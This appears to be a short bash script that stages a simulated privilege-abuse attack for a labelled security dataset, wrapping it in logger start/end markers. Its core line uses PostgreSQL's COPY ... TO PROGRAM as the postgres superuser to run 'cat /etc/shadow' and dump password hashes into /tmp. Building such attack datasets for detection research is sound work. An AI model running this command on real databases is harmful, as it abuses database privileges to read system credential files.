#!/bin/bash
echo "Simulating Privilege Abuse Attack (cat_shadow)..."
/dataset_workspace/logger.sh mark_attack "attack_priv_cat_shadow" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT 1) TO PROGRAM 'cat /etc/shadow > /tmp/out_cat_shadow.txt 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_priv_cat_shadow" end
